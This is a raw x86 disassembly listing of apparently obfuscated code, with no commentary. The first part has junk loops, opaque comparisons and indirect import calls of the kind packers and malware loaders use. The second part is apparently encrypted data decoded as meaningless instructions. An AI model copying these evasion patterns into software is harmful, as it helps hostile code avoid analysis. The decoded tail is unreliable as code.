  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429d55
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x430a3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x430a40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x430a0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x430a44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x430a10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x430a14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x430a48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     cl,BYTE PTR ds:0x8441723c
  417976:	mov    eax,0x9ce87b7a
  41797b:	jnp    0x4179f8
  41797d:	sbb    DWORD PTR [edi*4+0x36d52912],ecx
  417984:	inc    edi
  417985:	jne    0x4179af
  417987:	int    0x19
  417989:	imul   eax,DWORD PTR [esi-0x3e],0xfffffffc
  41798d:	pop    es
  41798e:	sub    esi,DWORD PTR [eax+0x5d]
  417991:	or     DWORD PTR [ebx],ebp
  417993:	(bad)  
  417994:	dec    edi
  417995:	mov    ds:0x56e43127,al
  41799a:	in     al,0x43
  41799c:	dec    esp
  41799d:	loope  0x417928
  41799f:	aas    
  4179a0:	dec    ebp
  4179a1:	dec    esi
  4179a2:	mov    esp,0x7112da38
  4179a7:	pop    ebx
  4179a8:	in     al,0xdc
  4179aa:	push   0xda2441f4
  4179af:	xlat   BYTE PTR ds:[ebx]
  4179b0:	sub    eax,0xcb4cfe68
  4179b5:	int    0x73
  4179b7:	(bad)  
  4179b8:	out    dx,al
  4179b9:	loope  0x417a05
  4179bb:	mov    dl,0x6e
  4179bd:	pop    ds
  4179be:	scas   al,BYTE PTR es:[edi]
  4179bf:	sub    al,0x64
  4179c1:	sbb    eax,0xf661f333
  4179c6:	jg     0x4179f4
  4179c8:	mov    ecx,0x92f0299
  4179cd:	sub    dl,BYTE PTR [ebx+0x2e]
  4179d0:	in     al,0x1a
  4179d2:	bound  esi,QWORD PTR [eax]
  4179d4:	or     eax,0x8321a755
  4179d9:	sub    al,0x3e
  4179db:	mov    ah,0x85
  4179dd:	enter  0x5a01,0x68
  4179e1:	mov    ah,0xfe
  4179e3:	dec    ebp
  4179e4:	es sub ax,0xda1d
  4179e9:	loope  0x4179d9
  4179eb:	cmp    al,0x8d
  4179ed:	(bad)  
  4179ee:	sti    
  4179ef:	add    al,0xca
  4179f1:	jbe    0x417a3c
  4179f3:	out    0x92,eax
  4179f5:	or     cl,al
  4179f7:	jle    0x4179b3
  4179f9:	retf   0x99c3
  4179fc:	shr    DWORD PTR [esi+esi*1],1
  4179ff:	loop   0x417a7a
  417a01:	adc    dh,ch
  417a03:	sbb    DWORD PTR [eax],0x69
  417a06:	xor    ah,BYTE PTR [ebx-0x5]
  417a09:	cld    
  417a0a:	mov    edx,ebp
  417a0c:	aam    0xf7
  417a0e:	inc    edx
  417a0f:	into   
  417a10:	stos   DWORD PTR es:[edi],eax
  417a11:	lea    edx,[ebp-0x11ac56c5]
  417a17:	je     0x417a48
  417a19:	pop    ds
  417a1a:	(bad)  
  417a1b:	push   ebx
  417a1c:	pop    ss
  417a1d:	(bad)  
  417a1e:	mov    dl,0x6e
  417a20:	mov    WORD PTR [edx+0x6d74dedd],?
  417a26:	fisttp WORD PTR [edi]
  417a28:	jmp    0xf794:0x9af17026
  417a2f:	add    ebp,ebx
  417a31:	mov    cl,0x95
  417a33:	lods   al,BYTE PTR ds:[esi]
  417a34:	dec    ecx
  417a35:	and    BYTE PTR [ecx],bh
  417a37:	addr16 push ebp
  417a39:	inc    ebp
  417a3a:	inc    edi
  417a3b:	add    eax,0x4e8974f5
  417a40:	jp     0x417a9d
  417a42:	aam    0xa8
  417a44:	pop    ds
  417a45:	stc    
  417a46:	in     eax,0x6c
  417a48:	xchg   ebx,eax
  417a49:	jb     0x417a0a
  417a4b:	jg     0x417a8a
  417a4d:	addr16 mov ah,0xa8
  417a50:	out    dx,al
  417a51:	pavgw  mm7,QWORD PTR [ecx]
  417a54:	(bad)  
  417a56:	push   ebp
  417a57:	sub    DWORD PTR ds:0xd8539855,ebp
  417a5d:	cmc    
  417a5e:	mov    dl,0xaf
  417a60:	call   0x62b8:0x57461e57
  417a67:	repz sub eax,0xa8cce155
  417a6d:	cs sub al,0xb4
  417a70:	lock inc ecx
  417a72:	(bad)  
  417a73:	and    al,0x1c
  417a75:	sub    BYTE PTR [edx],dh
  417a77:	adc    al,0x3e
  417a79:	(bad)  
  417a7b:	js     0x417a72
  417a7d:	xchg   esp,eax
  417a7e:	icebp  
  417a7f:	mov    bh,0xfa
  417a81:	xlat   BYTE PTR ds:[ebx]
  417a82:	mov    ebp,0x5da1de35
  417a87:	out    dx,eax
  417a88:	bound  ecx,QWORD PTR [ebp+0x2db1eb29]
  417a8e:	stc    
  417a8f:	enter  0x5369,0xc2
  417a93:	pop    ss
  417a94:	das    
  417a95:	jge    0x417a51
  417a97:	in     eax,0x30
  417a99:	lock mov bh,0x20
  417a9c:	clc    
  417a9d:	inc    edx
  417a9e:	repnz mov eax,ds:0xdc3f897c
  417aa4:	aaa    
  417aa5:	nop
  417aa6:	ins    DWORD PTR es:[edi],dx
  417aa7:	int3   
  417aa8:	inc    ecx
  417aa9:	das    
  417aaa:	jo     0x417aea
  417aac:	cmp    al,0x1
  417aae:	pop    edi
  417aaf:	gs pop edi
  417ab1:	add    al,0xb1
  417ab3:	mov    al,0xbf
  417ab5:	lods   eax,DWORD PTR ds:[esi]
  417ab6:	dec    eax
  417ab7:	scas   eax,DWORD PTR es:[edi]
  417ab8:	add    edx,ebx
  417aba:	mov    ds:0x46da92d4,eax
  417abf:	cmp    DWORD PTR [edi-0x5d],edx
  417ac2:	neg    cl
  417ac4:	pop    edx
  417ac5:	popa   
  417ac6:	call   0xdd84:0xbcb948e2
  417acd:	shl    BYTE PTR [ecx-0xd],1
  417ad0:	or     eax,ebx
  417ad2:	iret   
  417ad3:	lock pop eax
  417ad5:	(bad)  
  417ad6:	mov    al,ds:0x2c3a5bc
  417adb:	mov    al,ds:0xa30f07fb
  417ae0:	fcmovne st,st(6)
  417ae2:	dec    edx
  417ae3:	ja     0x417b40
  417ae5:	xchg   ebx,eax
  417ae6:	dec    ebx
  417ae7:	shl    eax,cl
  417ae9:	repnz inc esp
  417aeb:	mov    ah,0xa7
  417aed:	dec    edx
  417aee:	xor    BYTE PTR [esi+0x53],dl
  417af1:	sbb    bh,BYTE PTR [edx-0x18304e05]
  417af7:	mov    ebp,0xa5e534e2
  417afc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417afd:	test   esp,0x45f22950
  417b03:	sub    BYTE PTR [ebp-0x1bc04335],dh
  417b09:	xor    al,0x90
  417b0b:	dec    ecx
  417b0c:	dec    ebx
  417b0d:	ja     0x417ae9
  417b0f:	js     0x417b1b
  417b11:	dec    ebx
  417b12:	or     edi,ebp
  417b14:	les    edi,FWORD PTR ds:0xc0fbc214
  417b1a:	xchg   esi,eax
  417b1b:	jge    0x417b16
  417b1d:	xchg   ecx,eax
  417b1e:	call   0x44b5:0x6dc02074
  417b25:	retf   
  417b26:	outs   dx,BYTE PTR ds:[esi]
  417b27:	sti    
  417b28:	and    DWORD PTR [eax+edi*2+0x1e],0x9
  417b2d:	inc    ecx
  417b2e:	dec    edi
  417b2f:	mov    cl,0xcb
  417b31:	pop    ss
  417b32:	sbb    esi,DWORD PTR [ebx]
  417b34:	mov    dh,BYTE PTR [eax]
  417b36:	and    al,0x9b
  417b38:	jbe    0x417b1c
  417b3a:	mov    ebp,0x1d259639
  417b3f:	jmp    0x2ba3175b
  417b44:	arpl   WORD PTR [edi],bp
  417b46:	lds    ecx,FWORD PTR [edi+0xdd10681]
  417b4c:	inc    eax
  417b4d:	add    dh,dl
  417b4f:	(bad)  
  417b50:	sub    BYTE PTR [eax+0x41d63a9d],cl
  417b56:	nop
  417b57:	aaa    
  417b58:	rol    DWORD PTR [ecx+0x157569d0],cl
  417b5e:	push   ss
  417b5f:	out    0x41,eax
  417b61:	lock sahf 
  417b63:	dec    ebx
  417b64:	jo     0x417ae9
  417b66:	add    BYTE PTR [esi-0x55ac6be8],ah
  417b6c:	jmp    0x9196:0x371997b
  417b73:	and    al,0x23
  417b75:	jl     0x417bb8
  417b77:	mov    ?,WORD PTR [ecx]
  417b79:	push   ebp
  417b7a:	mov    cl,BYTE PTR [esi+0x6d78d95e]
  417b80:	cmp    DWORD PTR [ebp-0xf1ed32e],eax
  417b86:	js     0x417b5d
  417b88:	sub    BYTE PTR [ebp-0x30],bh
  417b8b:	(bad)  
  417b8c:	xor    al,0x3b
  417b8e:	fdiv   DWORD PTR [eax-0x1aa62f3e]
  417b94:	mov    ah,0x64
  417b96:	addr16 (bad) 
  417b98:	cmp    eax,0xd4329f66
  417b9d:	out    0x54,al
  417b9f:	(bad)  
  417ba0:	call   0xfa1bd465
  417ba5:	and    eax,0x9a107be8
  417baa:	add    al,0xd0
  417bac:	mov    ecx,esp
  417bae:	data16 xor bl,BYTE PTR [esi+0x17]
  417bb2:	adc    BYTE PTR [ebx],0x59
  417bb5:	xchg   ecx,edi
  417bb7:	mov    esi,0x91b1f8fd
  417bbc:	dec    edi
  417bbd:	es ja  0x417bd6
  417bc0:	enter  0x637c,0x41
  417bc4:	call   0xf278:0x264c1a6
  417bcb:	cli    
  417bcc:	cmc    
  417bcd:	cli    
  417bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bcf:	clc    
  417bd0:	xchg   edx,eax
  417bd1:	mov    ds:0xde7b2e5f,eax
  417bd6:	jns    0x417bf5
  417bd8:	arpl   dx,ax
  417bda:	aas    
  417bdb:	dec    ebx
  417bdc:	les    ebp,FWORD PTR [ecx+0x78e86565]
  417be2:	xor    ebx,ecx
  417be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417be6:	sbb    esp,DWORD PTR [eiz*2-0x65264b1e]
  417bed:	cmp    BYTE PTR [eax+0x16],ch
  417bf0:	mov    esi,0x6fa6aa52
  417bf5:	lods   eax,DWORD PTR ds:[esi]
  417bf6:	test   DWORD PTR [eax],esp
  417bf8:	ror    DWORD PTR gs:[eax],1
  417bfb:	or     al,0xd9
  417bfd:	sbb    DWORD PTR [ebx],esp
  417bff:	dec    esi
  417c00:	es push ebx
  417c02:	lea    ecx,ds:0xfd013198
  417c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c09:	dec    ebp
  417c0a:	enter  0x2d7d,0xb6
  417c0e:	stc    
  417c0f:	add    esp,ebx
  417c11:	inc    esi
  417c12:	xor    BYTE PTR [ebx-0x327a9209],0x99
  417c19:	sbb    cl,ch
  417c1b:	dec    esi
  417c1c:	mov    ebp,0xc92f251e
  417c21:	rcl    BYTE PTR ds:0x2a7af1b5,0x86
  417c28:	push   esi
  417c29:	pop    es
  417c2a:	jg     0x417bc7
  417c2c:	or     BYTE PTR [esi+0xc],dl
  417c2f:	add    esp,edi
  417c31:	mov    esi,0x3d31e642
  417c36:	xchg   edx,eax
  417c37:	pop    es
  417c38:	test   al,0x2d
  417c3a:	ror    DWORD PTR [ecx+0x70],1
  417c3d:	mov    dl,0xf0
  417c3f:	loopne 0x417c65
  417c41:	inc    esp
  417c42:	cld    
  417c43:	loope  0x417c52
  417c45:	(bad)  
  417c46:	fwait
  417c47:	mov    bl,0x1c
  417c49:	add    eax,0xd8942ec8
  417c4e:	pushf  
  417c4f:	test   BYTE PTR [ecx],dl
  417c51:	mov    esi,0x7ae2881d
  417c56:	test   DWORD PTR [esi-0xbea8a27],0x415fa85e
  417c60:	and    DWORD PTR [edi-0x3b4f496d],edx
  417c66:	fwait
  417c67:	or     esi,DWORD PTR [edx+eax*2]
  417c6a:	sub    bh,BYTE PTR [ecx-0x3b8126]
  417c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c71:	sub    eax,0xc19d81a3
  417c76:	and    eax,0x39a26532
  417c7b:	inc    esp
  417c7c:	arpl   WORD PTR [edi],cx
  417c7e:	int    0x16
  417c80:	mov    ds,WORD PTR [eax]
  417c82:	pop    esp
  417c83:	push   eax
  417c84:	or     al,0xa5
  417c86:	imul   BYTE PTR [esp+edi*1+0x7199f75b]
  417c8d:	test   DWORD PTR [eax-0x429c8b28],ebx
  417c93:	mov    dl,0x19
  417c95:	or     al,0xb9
  417c97:	sbb    al,cl
  417c99:	xchg   ecx,eax
  417c9a:	push   eax
  417c9b:	popf   
  417c9c:	jp     0x417c34
  417c9e:	aad    0x2
  417ca0:	cld    
  417ca1:	push   ebp
  417ca2:	xchg   ebp,eax
  417ca3:	jle    0x417c35
  417ca5:	pusha  
  417ca6:	int3   
  417ca7:	stos   DWORD PTR es:[edi],eax
  417ca8:	inc    esi
  417ca9:	and    DWORD PTR [ecx],ebx
  417cab:	jp     0x417ca8
  417cad:	dec    ebx
  417cae:	rcl    esi,cl
  417cb0:	loope  0x417d19
  417cb2:	out    0x5a,eax
  417cb4:	cmp    BYTE PTR [ecx-0x1d31435c],ch
  417cba:	xchg   esi,eax
  417cbb:	mov    bh,0x62
  417cbd:	scas   al,BYTE PTR es:[edi]
  417cbe:	retf   
  417cbf:	std    
  417cc0:	push   ebx
  417cc1:	and    DWORD PTR [ecx],ecx
  417cc3:	inc    esp
  417cc4:	cwde   
  417cc5:	mov    al,0x79
  417cc7:	fdivr  QWORD PTR [edx+esi*2+0x6b]
  417ccb:	mov    esi,0xa67e9352
  417cd0:	faddp  st(1),st
  417cd2:	jbe    0x417c63
  417cd4:	jge    0x417cfc
  417cd6:	mov    eax,ds:0xc4e7e68
  417cdb:	call   0x756d:0xed5
  417ce1:	loop   0x417d2f
  417ce3:	dec    ebp
  417ce4:	xor    BYTE PTR [ebp-0x20ea2709],bl
  417cea:	mov    edx,0xf6d42500
  417cef:	sbb    DWORD PTR [esi+edi*1-0x11eed0e7],ebx
  417cf6:	aam    0xec
  417cf8:	mov    dh,0x9
  417cfa:	sbb    eax,0xb662b4fe
  417cff:	hlt    
  417d00:	dec    esi
  417d01:	popa   
  417d02:	bound  eax,QWORD PTR [esi+ebx*1]
  417d05:	retf   0xcd50
  417d08:	inc    edx
  417d09:	sub    ah,bh
  417d0b:	ret    0x9874
  417d0e:	retf   0xb39c
  417d11:	adc    dl,dh
  417d13:	dec    esi
  417d14:	push   0x2f912097
  417d19:	mov    bl,0xf2
  417d1b:	push   ebx
  417d1c:	jne    0x417cdf
  417d1e:	mov    BYTE PTR [ebx],cl
  417d20:	push   ecx
  417d21:	inc    edx
  417d22:	icebp  
  417d23:	dec    esi
  417d24:	mov    dl,0xa9
  417d26:	jmp    0xc79f:0x4779d1a4
  417d2d:	inc    ebx
  417d2e:	lods   al,BYTE PTR ds:[esi]
  417d2f:	cwde   
  417d30:	ins    DWORD PTR es:[edi],dx
  417d31:	xchg   edx,eax
  417d32:	ds jbe 0x417cb5
  417d35:	mov    ah,bh
  417d37:	rol    DWORD PTR [edi],cl
  417d39:	clc    
  417d3a:	(bad)  
  417d3b:	push   ebx
  417d3c:	xchg   DWORD PTR [edx+0x1f3ccf22],ecx
  417d42:	test   al,0x53
  417d44:	stc    
  417d45:	loopne 0x417d3f
  417d47:	inc    ecx
  417d48:	cmp    bl,BYTE PTR ds:0xbcd8fc83
  417d4e:	pop    ebp
  417d4f:	xchg   BYTE PTR [edi-0x5c],dh
  417d52:	imul   edi,DWORD PTR [edi],0xd
  417d55:	jbe    0x417cf8
  417d57:	neg    BYTE PTR [eax+0x11]
  417d5a:	dec    esp
  417d5b:	adc    edi,esi
  417d5d:	sbb    DWORD PTR [ecx-0x7d8bfa0e],eax
  417d63:	sub    al,BYTE PTR [esi]
  417d65:	addr16 call 0xa026:0x265c0721
  417d6d:	(bad)  
  417d6e:	(bad)  
  417d6f:	mov    BYTE PTR [ecx+0xd],cl
  417d72:	xchg   DWORD PTR [edx-0x30],edi
  417d75:	jae    0x417d34
  417d77:	cmp    BYTE PTR [esi],dh
  417d79:	fcomp  DWORD PTR [ecx]
  417d7b:	je     0x417d0c
  417d7d:	mov    dl,0x83
  417d7f:	jmp    0x57b7:0x2ac90af3
  417d86:	dec    ebp
  417d87:	fdecstp 
  417d89:	mov    bl,0x9a
  417d8b:	sub    edx,ebp
